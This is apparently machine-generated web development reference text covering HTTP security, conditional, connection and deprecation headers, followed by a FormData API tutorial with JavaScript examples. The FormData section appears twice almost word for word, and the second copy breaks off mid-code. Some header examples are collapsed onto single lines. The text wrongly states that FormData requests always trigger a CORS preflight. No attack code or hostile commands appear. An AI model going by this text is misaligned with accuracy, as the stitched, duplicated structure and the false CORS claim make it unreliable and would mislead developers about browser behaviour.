**Strict-Transport-Security (HSTS)** Forces browsers to use HTTPS for future requests:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

- `max-age=31536000`: Enforce HTTPS for 1 year
- `includeSubDomains`: Apply to all subdomains
- `preload`: Eligible for browser preload lists

[Unverified] Once sent, browsers refuse HTTP connections for the specified duration—cannot be easily reversed if misconfigured.

**Content-Security-Policy (CSP)** Controls resources the page can load, mitigating XSS attacks:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://api.example.com
```

Less relevant for pure API responses (JSON/XML), more important for APIs serving HTML.

**X-Content-Type-Options** Prevents MIME type sniffing:

```
X-Content-Type-Options: nosniff
```

Browsers strictly follow Content-Type header instead of attempting to infer content types.

**X-Frame-Options** Controls whether responses can be embedded in frames:

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://trusted.example.com
```

- `DENY`: Cannot be framed
- `SAMEORIGIN`: Can be framed only by same origin
- `ALLOW-FROM`: Can be framed by specified origin

Superseded by Content-Security-Policy frame-ancestors directive but still widely used.

**X-XSS-Protection** Legacy header enabling browser XSS filters:

```
X-XSS-Protection: 1; mode=block
```

Deprecated in favor of Content-Security-Policy but still used for older browser compatibility.

### Conditional Request Headers

**If-Match** Processes request only if resource ETag matches:

```
PUT /api/users/123
If-Match: "v42"
If-Match: "v42", "v41", "v40"
```

Multiple ETags can be specified. Succeeds if current ETag matches any.

```
If-Match: *
```

Wildcard succeeds if resource exists (regardless of ETag).

**If-None-Match** Inverse of If-Match:

```
GET /api/users/123
If-None-Match: "v42"
```

For GET: Returns 304 if ETag matches (resource unchanged).
For PUT/POST: Succeeds only if ETag doesn't match (typically used with wildcard `*` to prevent overwriting existing resources).

**If-Modified-Since**
Processes request only if resource modified after specified time:

```

GET /api/articles/456 If-Modified-Since: Wed, 15 Dec 2024 10:00:00 GMT

```

Returns 304 if not modified since that time.

**If-Unmodified-Since**
Processes request only if resource not modified since specified time:

```

PUT /api/articles/456 If-Unmodified-Since: Wed, 15 Dec 2024 10:00:00 GMT

```

Returns 412 if modified since that time. Prevents overwriting newer versions.

**If-Range**
Combines conditional request with range request:

```

GET /files/video.mp4 Range: bytes=1000000- If-Range: "etag-value"

```

If resource matches ETag, returns partial content (206). If resource changed, returns complete resource (200), allowing client to restart with new version.

### Connection Management Headers

**Connection**
Controls connection persistence:

```

Connection: keep-alive Connection: close

```

- `keep-alive`: Maintain connection for multiple requests (default in HTTP/1.1)
- `close`: Close connection after response

HTTP/1.1 assumes persistent connections. HTTP/2 deprecates this header.

**Keep-Alive**
Parameters for persistent connections:

```

Keep-Alive: timeout=5, max=100

```

- `timeout`: Seconds the connection stays open while idle
- `max`: Maximum requests on this connection

Used with `Connection: keep-alive`.

**TE**
Client indicates acceptable transfer encodings:

```

TE: trailers, deflate;q=0.5

```

Similar to Accept-Encoding but for transfer encodings rather than content encodings.

**Transfer-Encoding**
Specifies encoding applied during transmission:

```

Transfer-Encoding: chunked Transfer-Encoding: gzip, chunked

```

- `chunked`: Response sent in chunks (size unknown in advance)
- `gzip`, `deflate`: Compression applied
- `identity`: No encoding (rarely specified)

Chunked encoding enables streaming responses without knowing total size upfront.

**Trailer**
Announces which headers will appear in chunked encoding trailers:

```

HTTP/1.1 200 OK Transfer-Encoding: chunked Trailer: X-Checksum, X-Processing-Time

5 Hello 5 World 0 X-Checksum: abc123 X-Processing-Time: 45ms

```

Trailers appear after the message body, useful for headers whose values aren't known until processing completes.

### Deprecation and Sunset Headers

**Deprecation (RFC draft)**
Signals that a resource or endpoint is deprecated:

```

HTTP/1.1 200 OK Deprecation: true Deprecation: Wed, 01 Jan 2025 00:00:00 GMT

```

Boolean `true` or date when deprecation takes effect. Clients should transition away from deprecated endpoints.

**Sunset (RFC 8594)**
Indicates when a resource will become unavailable:

```

HTTP/1.1 200 OK Sunset: Wed, 31 Dec 2025 23:59:59 GMT Link: [https://api.example.com/docs/migration](https://api.example.com/docs/migration); rel="sunset"

```

Provides date of removal. Link header can point to migration documentation.

Combined usage:
```

Deprecation: Sun, 01 Jun 2025 00:00:00 GMT Sunset: Sat, 01 Jan 2026 00:00:00 GMT

```

Deprecated June 2025, removed January 2026.

### Warning Header (Deprecated)

**Warning**
Originally for cache warnings, now deprecated:

```

Warning: 110 - "Response is Stale" Warning: 199 - "Miscellaneous Warning"

```

HTTP/1.1 defined various warning codes. Modern practices prefer structured error responses in message bodies over Warning headers.

### Header Size Limits and Best Practices

**Practical Limits:**
- Total request header size: Typically 8KB-16KB (server-dependent)
- Individual header: No standard limit, but 4KB is safe
- Number of headers: No standard limit, but hundreds cause problems

Exceeding limits results in 431 Request Header Fields Too Large.

**Design Recommendations:**

Use standard headers when available—don't create custom headers for functionality that existing headers provide.

Keep header values concise. Long authorization tokens, extensive cookies, or verbose custom headers consume the header size budget.

Prefer request bodies over headers for large data. Headers are for metadata; bodies carry content.

Document custom headers clearly—specify format, constraints, and behavior.

Version custom headers if they may evolve. Include version in the header name or value structure.

Validate header values rigorously—headers come from untrusted clients and may contain injection attacks or malformed data.

Use lowercase for custom header names in HTTP/2 and HTTP/3 (requirements). HTTP/1.1 is case-insensitive but consistency helps.

Avoid redundancy—don't include information already available through other headers or the request itself.

Consider privacy—headers appear in logs, so avoid including sensitive information when possible.
```

---

# Request Body

## FormData API

### Core Concepts

The FormData API provides a programmatic interface for constructing and manipulating form data as key-value pairs. It represents the data structure used when submitting HTML forms with `enctype="multipart/form-data"`, but can be used independently of actual form elements.

FormData objects are particularly useful for:

- Uploading files via XHR or Fetch
- Constructing form submissions programmatically
- Appending binary data alongside text fields
- Sending mixed content types in a single request

### Creating FormData Objects

**Empty FormData**

```javascript
const formData = new FormData();
formData.append('username', 'john_doe');
formData.append('email', 'john@example.com');
```

**From Existing Form Element**

```javascript
const form = document.querySelector('#myForm');
const formData = new FormData(form);

// All form fields are automatically captured
// including <input>, <select>, <textarea>, and file inputs
```

**From Form with Submitter Context**

```javascript
const form = document.querySelector('#myForm');
const submitButton = document.querySelector('#submitBtn');

// Second parameter captures the submitter element
const formData = new FormData(form, submitButton);
// If submitButton has name/value, it's included in formData
```

### Adding Data

**append() Method**

Adds a new value for a key, or adds another value if the key already exists:

```javascript
const formData = new FormData();

// Text values
formData.append('username', 'john_doe');
formData.append('age', 25);
formData.append('age', 30); // Multiple values for same key

// Boolean and numeric values are converted to strings
formData.append('active', true); // Stored as "true"
formData.append('count', 42); // Stored as "42"
```

**set() Method**

Replaces any existing values for a key with a single new value:

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('username', 'jane'); // Now has 2 values

formData.set('username', 'alice'); // Replaces both with single value
```

### File Uploads

**File Input Elements**

```javascript
const fileInput = document.querySelector('#fileUpload');
const file = fileInput.files[0];

const formData = new FormData();
formData.append('document', file);
formData.append('description', 'Important document');
```

**Multiple Files**

```javascript
const fileInput = document.querySelector('#multipleFiles');

const formData = new FormData();
for (const file of fileInput.files) {
  formData.append('files', file); // Same key for multiple files
}

// Alternative: different keys
Array.from(fileInput.files).forEach((file, index) => {
  formData.append(`file_${index}`, file);
});
```

**Blob Objects**

```javascript
const blob = new Blob(['Hello, world!'], { type: 'text/plain' });
formData.append('textfile', blob, 'hello.txt'); // Third param is filename

// Canvas to blob
canvas.toBlob((blob) => {
  formData.append('screenshot', blob, 'screenshot.png');
});
```

**File Constructor**

```javascript
const fileContent = new Uint8Array([137, 80, 78, 71]); // PNG header
const file = new File([fileContent], 'image.png', { type: 'image/png' });

formData.append('customFile', file);
```

### Reading Data

**get() Method**

Returns the first value associated with a key:

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('username', 'jane');

const value = formData.get('username'); // Returns 'john'
const missing = formData.get('nonexistent'); // Returns null
```

**getAll() Method**

Returns all values associated with a key as an array:

```javascript
const formData = new FormData();
formData.append('tag', 'javascript');
formData.append('tag', 'web');
formData.append('tag', 'api');

const tags = formData.getAll('tag'); 
// Returns ['javascript', 'web', 'api']

const noTags = formData.getAll('nonexistent'); 
// Returns []
```

**has() Method**

Checks if a key exists:

```javascript
const formData = new FormData();
formData.append('username', 'john');

formData.has('username'); // true
formData.has('email'); // false
```

### Modifying Data

**delete() Method**

Removes all values for a key:

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('username', 'jane');

formData.delete('username');
formData.has('username'); // false
```

**set() Method for Updates**

```javascript
const formData = new FormData();
formData.append('count', 1);
formData.set('count', 2); // Replaces value

// For files, set() also accepts filename parameter
formData.set('file', blob, 'updated.txt');
```

### Iteration

**entries() Method**

Returns an iterator of [key, value] pairs:

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('email', 'john@example.com');
formData.append('tags', 'js');
formData.append('tags', 'api');

for (const [key, value] of formData.entries()) {
  console.log(key, value);
}
// Output:
// username john
// email john@example.com
// tags js
// tags api
```

**keys() Method**

Returns an iterator of keys:

```javascript
for (const key of formData.keys()) {
  console.log(key);
}
// Output: username, email, tags, tags
```

**values() Method**

Returns an iterator of values:

```javascript
for (const value of formData.values()) {
  console.log(value);
}
// Output: john, john@example.com, js, api
```

**forEach() Method**

```javascript
formData.forEach((value, key) => {
  console.log(`${key}: ${value}`);
});

// With index parameter
formData.forEach((value, key, formData) => {
  console.log(`${key}: ${value}`);
  // Third parameter is the FormData object itself
});
```

### Sending FormData

**Fetch API**

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('file', fileInput.files[0]);

fetch('https://api.example.com/upload', {
  method: 'POST',
  body: formData
  // Do NOT set Content-Type header manually
  // Browser sets it automatically with boundary parameter
})
  .then(response => response.json())
  .then(data => console.log(data));
```

**XMLHttpRequest**

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://api.example.com/upload');

xhr.upload.addEventListener('progress', (e) => {
  if (e.lengthComputable) {
    const percentComplete = (e.loaded / e.total) * 100;
    console.log(`Upload: ${percentComplete}%`);
  }
});

xhr.addEventListener('load', () => {
  console.log('Upload complete');
});

xhr.send(formData);
```

**Automatic Content-Type**

When sending FormData, browsers automatically set:

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
```

The boundary parameter is a unique string used to separate form fields in the request body. Never set `Content-Type` manually when sending FormData, as the browser must generate the boundary.

### Content-Type Encoding

**multipart/form-data Structure**

FormData is transmitted as multipart/form-data:

```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

john_doe
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="document.pdf"
Content-Type: application/pdf

[binary data]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Each field is separated by the boundary string, with metadata headers followed by the actual data.

**File Metadata**

For file uploads, the browser includes:

- `Content-Disposition`: Contains field name and filename
- `Content-Type`: MIME type of the file

```
Content-Disposition: form-data; name="avatar"; filename="photo.jpg"
Content-Type: image/jpeg
```

### Converting FormData

**To URLSearchParams**

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('age', 25);

const params = new URLSearchParams(formData);
console.log(params.toString()); 
// username=john&age=25

// Note: Files are converted to "[object File]" string
// This conversion is rarely useful for file uploads
```

**To Plain Object**

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('email', 'john@example.com');

// Single values per key
const obj = Object.fromEntries(formData.entries());
// { username: 'john', email: 'john@example.com' }

// Multiple values handling
const objWithArrays = {};
for (const [key, value] of formData.entries()) {
  if (objWithArrays[key]) {
    if (Array.isArray(objWithArrays[key])) {
      objWithArrays[key].push(value);
    } else {
      objWithArrays[key] = [objWithArrays[key], value];
    }
  } else {
    objWithArrays[key] = value;
  }
}
```

**To JSON**

```javascript
// Direct conversion loses file data
const json = JSON.stringify(Object.fromEntries(formData));

// Files become: {"file": {}}
// Blobs become: {"blob": {}}
```

FormData cannot be directly serialized to JSON with file preservation. For JSON APIs with file uploads, use alternative approaches:

- Base64 encode files within JSON
- Send files separately via FormData, then reference in JSON payload
- Use multipart/form-data and parse on server

### From JSON to FormData

```javascript
const data = {
  username: 'john',
  email: 'john@example.com',
  tags: ['javascript', 'web'],
  active: true
};

const formData = new FormData();

Object.entries(data).forEach(([key, value]) => {
  if (Array.isArray(value)) {
    value.forEach(item => formData.append(key, item));
  } else {
    formData.append(key, value);
  }
});
```

### File Name Handling

**Extracting File Names**

```javascript
const formData = new FormData();
formData.append('file', file);

const uploadedFile = formData.get('file');
if (uploadedFile instanceof File) {
  console.log(uploadedFile.name); // Original filename
  console.log(uploadedFile.type); // MIME type
  console.log(uploadedFile.size); // Size in bytes
  console.log(uploadedFile.lastModified); // Timestamp
}
```

**Custom File Names**

```javascript
// Override filename for Blob
const blob = new Blob(['content'], { type: 'text/plain' });
formData.append('file', blob, 'custom-name.txt');

// Override filename for File
const file = fileInput.files[0];
formData.append('file', file, 'renamed-file.pdf');
```

### CORS Considerations

FormData follows standard CORS rules:

```javascript
fetch('https://api.example.com/upload', {
  method: 'POST',
  body: formData,
  credentials: 'include' // Include cookies cross-origin
});
```

Server must respond with appropriate headers:

```
Access-Control-Allow-Origin: https://yoursite.com
Access-Control-Allow-Methods: POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
```

FormData requests are never simple requests (they use `multipart/form-data`), so they trigger CORS preflight.

### Size Limitations

**Browser Limits**

[Inference] Browsers typically don't impose specific FormData size limits in memory, but practical constraints include:

- Available RAM for constructing the FormData object
- Server request size limits (often 10MB-100MB default)
- Network timeouts for large uploads
- Maximum file sizes in file input elements

**Server Configuration**

Common server limits:

- nginx: `client_max_body_size` (default 1MB)
- Apache: `LimitRequestBody` (default unlimited, practically limited by system)
- Node.js Express: `body-parser` or `multer` limits
- PHP: `upload_max_filesize` and `post_max_size`

### Progress Monitoring

**Upload Progress with XHR**

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', '/upload');

xhr.upload.addEventListener('progress', (e) => {
  if (e.lengthComputable) {
    const percentComplete = (e.loaded / e.total) * 100;
    updateProgressBar(percentComplete);
  }
});

xhr.upload.addEventListener('load', () => {
  console.log('Upload finished');
});

xhr.upload.addEventListener('error', () => {
  console.error('Upload failed');
});

xhr.upload.addEventListener('abort', () => {
  console.log('Upload cancelled');
});

xhr.send(formData);
```

**Fetch API Limitations**

[Unverified] The Fetch API does not currently provide a standard mechanism for monitoring upload progress. Some browsers may support experimental APIs or extensions, but there's no cross-browser standard.

Workarounds include:

- Using XHR for uploads requiring progress
- Server-sent events for server-side progress updates
- Polling a status endpoint after initiating upload

### FormData and Service Workers

Service workers can intercept and modify FormData requests:

```javascript
self.addEventListener('fetch', (event) => {
  if (event.request.method === 'POST') {
    event.respondWith(
      event.request.formData().then((formData) => {
        // Add timestamp
        formData.append('timestamp', Date.now());
        
        // Create new request with modified FormData
        const modifiedRequest = new Request(event.request.url, {
          method: 'POST',
          body: formData,
          headers: event.request.headers
        });
        
        return fetch(modifiedRequest);
      })
    );
  }
});
```

**Reading FormData in Service Workers**

```javascript
// Clone request to read body (body can only be read once)
const clonedRequest = event.request.clone();

clonedRequest.formData().then((formData) => {
  console.log('Intercepted form data:');
  for (const [key, value] of formData.entries()) {
    console.log(key, value);
  }
});
```

### Common Patterns

**Form Submission Handler**

```javascript
document.querySelector('#myForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  
  const formData = new FormData(e.target);
  
  // Add additional data
  formData.append('timestamp', Date.now());
  formData.append('source', 'web-app');
  
  try {
    const response = await fetch('/api/submit', {
      method: 'POST',
      body: formData
    });
    
    if (response.ok) {
      const result = await response.json();
      console.log('Success:', result);
    } else {
      console.error('Error:', response.status);
    }
  } catch (error) {
    console.error('Network error:', error);
  }
});
```

**File Upload with Preview**

```javascript
const fileInput = document.querySelector('#fileInput');
const preview = document.querySelector('#preview');

fileInput.addEventListener('change', (e) => {
  const file = e.target.files[0];
  
  if (file && file.type.startsWith('image/')) {
    const reader = new FileReader();
    
    reader.onload = (e) => {
      preview.src = e.target.result;
    };
    
    reader.readAsDataURL(file);
    
    // Prepare FormData for upload
    const formData = new FormData();
    formData.append('image', file);
    formData.append('caption', 'User uploaded image');
    
    uploadImage(formData);
  }
});

async function uploadImage(formData) {
  const response = await fetch('/api/upload-image', {
    method: 'POST',
    body: formData
  });
  
  const result = await response.json();
  console.log('Uploaded:', result.url);
}
```

**Dynamic Field Addition**

```javascript
const formData = new FormData();

// Add fields based on conditions
const includeOptionalFields = true;

formData.append('required_field', 'value');

if (includeOptionalFields) {
  formData.append('optional_field', 'optional_value');
}

// Add array of values
const selectedItems = ['item1', 'item2', 'item3'];
selectedItems.forEach(item => {
  formData.append('items[]', item);
});

// Add nested data (server must parse)
const userData = { name: 'John', age: 30 };
formData.append('user', JSON.stringify(userData));
```

### Debugging FormData

**Logging Contents**

```javascript
function logFormData(formData) {
  console.log('FormData contents:');
  for (const [key, value] of formData.entries()) {
    if (value instanceof File) {
      console.log(`${key}: File(${value.name}, ${value.size} bytes, ${value.type})`);
    } else if (value instanceof Blob) {
      console.log(`${key}: Blob(${value.size} bytes, ${value.type})`);
    } else {
      console.log(`${key}: ${value}`);
    }
  }
}

const formData = new FormData(form);
logFormData(formData);
```

**Network Inspection**

Browser DevTools show FormData in the Network tab:

- Request payload shows individual form fields
- Files display with name, type, and size
- Preview tab shows parsed form data structure

### Security Considerations

**File Type Validation**

```javascript
const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
const file = fileInput.files[0];

if (file && !allowedTypes.includes(file.type)) {
  console.error('Invalid file type');
  return;
}

// Note: Client-side validation is not sufficient
// Always validate on server (MIME type can be spoofed)
```

**File Size Validation**

```javascript
const maxSize = 5 * 1024 * 1024; // 5MB
const file = fileInput.files[0];

if (file && file.size > maxSize) {
  console.error('File too large');
  return;
}
```

**CSRF Protection**

```javascript
// Include CSRF token in FormData
const formData = new FormData(form);
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
formData.append('_csrf', csrfToken);

fetch('/api/submit', {
  method: 'POST',
  body: formData,
  credentials: 'same-origin' // Include cookies
});
```

**Content Sanitization**

[Inference] FormData itself doesn't sanitize input. Server-side validation and sanitization are essential:

- Validate field names and values
- Check file MIME types and content (not just extension)
- Scan uploaded files for malware
- Limit file sizes and number of files
- Validate image dimensions for image uploads

### Browser Compatibility

FormData API is widely supported in modern browsers. Key features and their support:

- Basic FormData: All modern browsers
- `FormData(form)` constructor: All modern browsers
- Iteration methods (`entries()`, `keys()`, `values()`): All modern browsers
- `set()` method: All modern browsers
- Second parameter of `FormData(form, submitter)`: [Inference] Supported in recent browser versions, but may not be available in older browsers

For legacy browser support, polyfills are available for iteration methods.

---

# Request Body

## FormData API

### Core Concepts

The FormData API provides a programmatic interface for constructing and manipulating form data as key-value pairs. It represents the data structure used when submitting HTML forms with `enctype="multipart/form-data"`, but can be used independently of actual form elements.

FormData objects are particularly useful for:

- Uploading files via XHR or Fetch
- Constructing form submissions programmatically
- Appending binary data alongside text fields
- Sending mixed content types in a single request

### Creating FormData Objects

**Empty FormData**

```javascript
const formData = new FormData();
formData.append('username', 'john_doe');
formData.append('email', 'john@example.com');
```

**From Existing Form Element**

```javascript
const form = document.querySelector('#myForm');
const formData = new FormData(form);

// All form fields are automatically captured
// including <input>, <select>, <textarea>, and file inputs
```

**From Form with Submitter Context**

```javascript
const form = document.querySelector('#myForm');
const submitButton = document.querySelector('#submitBtn');

// Second parameter captures the submitter element
const formData = new FormData(form, submitButton);
// If submitButton has name/value, it's included in formData
```

### Adding Data

**append() Method**

Adds a new value for a key, or adds another value if the key already exists:

```javascript
const formData = new FormData();

// Text values
formData.append('username', 'john_doe');
formData.append('age', 25);
formData.append('age', 30); // Multiple values for same key

// Boolean and numeric values are converted to strings
formData.append('active', true); // Stored as "true"
formData.append('count', 42); // Stored as "42"
```

**set() Method**

Replaces any existing values for a key with a single new value:

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('username', 'jane'); // Now has 2 values

formData.set('username', 'alice'); // Replaces both with single value
```

### File Uploads

**File Input Elements**

```javascript
const fileInput = document.querySelector('#fileUpload');
const file = fileInput.files[0];

const formData = new FormData();
formData.append('document', file);
formData.append('description', 'Important document');
```

**Multiple Files**

```javascript
const fileInput = document.querySelector('#multipleFiles');

const formData = new FormData();
for (const file of fileInput.files) {
  formData.append('files', file); // Same key for multiple files
}

// Alternative: different keys
Array.from(fileInput.files).forEach((file, index) => {
  formData.append(`file_${index}`, file);
});
```

**Blob Objects**

```javascript
const blob = new Blob(['Hello, world!'], { type: 'text/plain' });
formData.append('textfile', blob, 'hello.txt'); // Third param is filename

// Canvas to blob
canvas.toBlob((blob) => {
  formData.append('screenshot', blob, 'screenshot.png');
});
```

**File Constructor**

```javascript
const fileContent = new Uint8Array([137, 80, 78, 71]); // PNG header
const file = new File([fileContent], 'image.png', { type: 'image/png' });

formData.append('customFile', file);
```

### Reading Data

**get() Method**

Returns the first value associated with a key:

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('username', 'jane');

const value = formData.get('username'); // Returns 'john'
const missing = formData.get('nonexistent'); // Returns null
```

**getAll() Method**

Returns all values associated with a key as an array:

```javascript
const formData = new FormData();
formData.append('tag', 'javascript');
formData.append('tag', 'web');
formData.append('tag', 'api');

const tags = formData.getAll('tag'); 
// Returns ['javascript', 'web', 'api']

const noTags = formData.getAll('nonexistent'); 
// Returns []
```

**has() Method**

Checks if a key exists:

```javascript
const formData = new FormData();
formData.append('username', 'john');

formData.has('username'); // true
formData.has('email'); // false
```

### Modifying Data

**delete() Method**

Removes all values for a key:

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('username', 'jane');

formData.delete('username');
formData.has('username'); // false
```

**set() Method for Updates**

```javascript
const formData = new FormData();
formData.append('count', 1);
formData.set('count', 2); // Replaces value

// For files, set() also accepts filename parameter
formData.set('file', blob, 'updated.txt');
```

### Iteration

**entries() Method**

Returns an iterator of [key, value] pairs:

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('email', 'john@example.com');
formData.append('tags', 'js');
formData.append('tags', 'api');

for (const [key, value] of formData.entries()) {
  console.log(key, value);
}
// Output:
// username john
// email john@example.com
// tags js
// tags api
```

**keys() Method**

Returns an iterator of keys:

```javascript
for (const key of formData.keys()) {
  console.log(key);
}
// Output: username, email, tags, tags
```

**values() Method**

Returns an iterator of values:

```javascript
for (const value of formData.values()) {
  console.log(value);
}
// Output: john, john@example.com, js, api
```

**forEach() Method**

```javascript
formData.forEach((value, key) => {
  console.log(`${key}: ${value}`);
});

// With index parameter
formData.forEach((value, key, formData) => {
  console.log(`${key}: ${value}`);
  // Third parameter is the FormData object itself
});
```

### Sending FormData

**Fetch API**

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('file', fileInput.files[0]);

fetch('https://api.example.com/upload', {
  method: 'POST',
  body: formData
  // Do NOT set Content-Type header manually
  // Browser sets it automatically with boundary parameter
})
  .then(response => response.json())
  .then(data => console.log(data));
```

**XMLHttpRequest**

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://api.example.com/upload');

xhr.upload.addEventListener('progress', (e) => {
  if (e.lengthComputable) {
    const percentComplete = (e.loaded / e.total) * 100;
    console.log(`Upload: ${percentComplete}%`);
  }
});

xhr.addEventListener('load', () => {
  console.log('Upload complete');
});

xhr.send(formData);
```

**Automatic Content-Type**

When sending FormData, browsers automatically set:

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
```

The boundary parameter is a unique string used to separate form fields in the request body. Never set `Content-Type` manually when sending FormData, as the browser must generate the boundary.

### Content-Type Encoding

**multipart/form-data Structure**

FormData is transmitted as multipart/form-data:

```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

john_doe
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="document.pdf"
Content-Type: application/pdf

[binary data]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Each field is separated by the boundary string, with metadata headers followed by the actual data.

**File Metadata**

For file uploads, the browser includes:

- `Content-Disposition`: Contains field name and filename
- `Content-Type`: MIME type of the file

```
Content-Disposition: form-data; name="avatar"; filename="photo.jpg"
Content-Type: image/jpeg
```

### Converting FormData

**To URLSearchParams**

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('age', 25);

const params = new URLSearchParams(formData);
console.log(params.toString()); 
// username=john&age=25

// Note: Files are converted to "[object File]" string
// This conversion is rarely useful for file uploads
```

**To Plain Object**

```javascript
const formData = new FormData();
formData.append('username', 'john');
formData.append('email', 'john@example.com');

// Single values per key
const obj = Object.fromEntries(formData.entries());
// { username: 'john', email: 'john@example.com' }

// Multiple values handling
const objWithArrays = {};
for (const [key, value] of formData.entries()) {
  if (objWithArrays[key]) {
    if (Array.isArray(objWithArrays[key])) {
      objWithArrays[key].push(value);
    } else {
      objWithArrays[key] = [objWithArrays[key], value];
    }
  } else {
    objWithArrays[key] = value;
  }
}
```

**To JSON**

```javascript
// Direct conversion loses file data
const json = JSON.stringify(Object.fromEntries(formData));

// Files become: {"file": {}}
// Blobs become: {"blob": {}}
```

FormData cannot be directly serialized to JSON with file preservation. For JSON APIs with file uploads, use alternative approaches:

- Base64 encode files within JSON
- Send files separately via FormData, then reference in JSON payload
- Use multipart/form-data and parse on server

### From JSON to FormData

```javascript
const data = {
  username: 'john',
  email: 'john@example.com',
  tags: ['javascript', 'web'],
  active: true
};

const formData = new FormData();

Object.entries(data).forEach(([key, value]) => {
  if (Array.isArray(value)) {
    value.forEach(item => formData.append(key, item));
  } else {
    formData.append(key, value);
  }
});
```

### File Name Handling

**Extracting File Names**

```javascript
const formData = new FormData();
formData.append('file', file);

const uploadedFile = formData.get('file');
if (uploadedFile instanceof File) {
  console.log(uploadedFile.name); // Original filename
  console.log(uploadedFile.type); // MIME type
  console.log(uploadedFile.size); // Size in bytes
  console.log(uploadedFile.lastModified); // Timestamp
}
```

**Custom File Names**

```javascript
// Override filename for Blob
const blob = new Blob(['content'], { type: 'text/plain' });
formData.append('file', blob, 'custom-name.txt');

// Override filename for File
const file = fileInput.files[0];
formData.append('file', file, 'renamed-file.pdf');
```

### CORS Considerations

FormData follows standard CORS rules:

```javascript
fetch('https://api.example.com/upload', {
  method: 'POST',
  body: formData,
  credentials: 'include' // Include cookies cross-origin
});
```

Server must respond with appropriate headers:

```
Access-Control-Allow-Origin: https://yoursite.com
Access-Control-Allow-Methods: POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
```

FormData requests are never simple requests (they use `multipart/form-data`), so they trigger CORS preflight.

### Size Limitations

**Browser Limits**

[Inference] Browsers typically don't impose specific FormData size limits in memory, but practical constraints include:

- Available RAM for constructing the FormData object
- Server request size limits (often 10MB-100MB default)
- Network timeouts for large uploads
- Maximum file sizes in file input elements

**Server Configuration**

Common server limits:

- nginx: `client_max_body_size` (default 1MB)
- Apache: `LimitRequestBody` (default unlimited, practically limited by system)
- Node.js Express: `body-parser` or `multer` limits
- PHP: `upload_max_filesize` and `post_max_size`

### Progress Monitoring

**Upload Progress with XHR**

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', '/upload');

xhr.upload.addEventListener('progress', (e) => {
  if (e.lengthComputable) {
    const percentComplete = (e.loaded / e.total) * 100;
    updateProgressBar(percentComplete);
  }
});

xhr.upload.addEventListener('load', () => {
  console.log('Upload finished');
});

xhr.upload.addEventListener('error', () => {
  console.error('Upload failed');
});

xhr.upload.addEventListener('abort', () => {
  console.log('Upload cancelled');
});

xhr.send(formData);
```

**Fetch API Limitations**

[Unverified] The Fetch API does not currently provide a standard mechanism for monitoring upload progress. Some browsers may support experimental APIs or extensions, but there's no cross-browser standard.

Workarounds include:

- Using XHR for uploads requiring progress
- Server-sent events for server-side progress updates
- Polling a status endpoint after initiating upload

### FormData and Service Workers

Service workers can intercept and modify FormData requests:

```javascript
self.addEventListener('fetch', (event) => {
  if (event.request.method === 'POST') {
    event.respondWith(
      event.request.formData().then((formData) => {
        // Add timestamp
        formData.append('timestamp', Date.now());
        
        // Create new request with modified FormData
        const modifiedRequest = new Request(event.request.url, {
          method: 'POST',
          body: formData,
          headers: event.request.headers
        });
        
        return fetch(modifiedRequest);
      })
    );
  }
});
```

**Reading FormData in Service Workers**

```javascript
// Clone request to read body (body can only be read once)
const clonedRequest = event.request.clone();

clonedRequest.formData().then((formData) => {
  console.log('Intercepted form data:');
  for (const [key, value] of formData.entries()) {
    console.log(key, value);
  }
});
```

### Common Patterns

**Form Submission Handler**

```javascript
document.querySelector('#myForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  
  const formData = new FormData(e.target);
  
  // Add additional data
  formData.append('timestamp', Date.now());
  formData.append('source', 'web-app');
  
  try {
    const response = await fetch('/api/submit', {
      method: 'POST',
      body: formData
    });
    
    if (response.ok) {
      const result = await response.json();
      console.log('Success:', result);
    } else {
      console.error('Error:', response.status);
    }
  } catch (error) {
    console.error('Network error:', error);
  }
});
```

**File Upload with Preview**

```javascript
const fileInput = document.querySelector('#fileInput');
const preview = document.querySelector('#preview');

fileInput.addEventListener('change', (e) => {
  const file = e.target.files[0];
  
  if (file && file.type.startsWith('image/')) {
    const reader = new FileReader();
    
    reader.onload = (e) => {
      preview.src = e.target.result;
    };
    
    reader.readAsDataURL(file);
    
    // Prepare FormData for upload
    const formData = new FormData();
    formData.append('image', file);
    formData.append('caption', 'User uploaded image');
    
    uploadImage(formData);
  }
});

async function uploadImage(formData) {
  const response = await fetch('/api/upload-image', {
    method: 'POST',
    body: formData
  });
  
  const result = await response.json();
  console.log('Uploaded:', result.url);
}
```

**Dynamic Field Addition**

```javascript
const formData = new FormData();

